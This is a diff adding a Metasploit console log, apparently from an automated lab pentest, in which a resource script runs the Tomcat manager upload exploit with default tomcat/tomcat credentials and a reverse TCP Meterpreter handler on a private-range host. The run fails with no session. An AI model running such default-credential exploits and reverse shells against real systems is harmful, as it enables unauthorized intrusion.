@@ -1,0 +1,21 @@
+[1m[34m[*][0m Processing modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc for ERB directives.
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> use exploit/multi/http/tomcat_mgr_upload
+[0m[1m[34m[*][0m No payload configured, defaulting to java/meterpreter/reverse_tcp
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> set RHOSTS 192.168.56.103
+[0mRHOSTS => 192.168.56.103
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> set LHOST 192.168.56.102
+[0mLHOST => 192.168.56.102
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> set HTTPUSERNAME tomcat
+[0mHTTPUSERNAME => tomcat
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> set HTTPPASSWORD tomcat
+[0mHTTPPASSWORD => tomcat
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> set ExitOnSession true
+[0m[1m[33m[!][0m Unknown datastore option: ExitOnSession.
+ExitOnSession => true
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> run
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.56.102:4444 
+[1m[34m[*][0m Retrieving session ID and CSRF token...
+[1m[31m[-][0m Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (modules/drivers/exploitation/msf_scripts/192_168_56_103_tomcat_mgr_upload.rc)> exit
+[0m
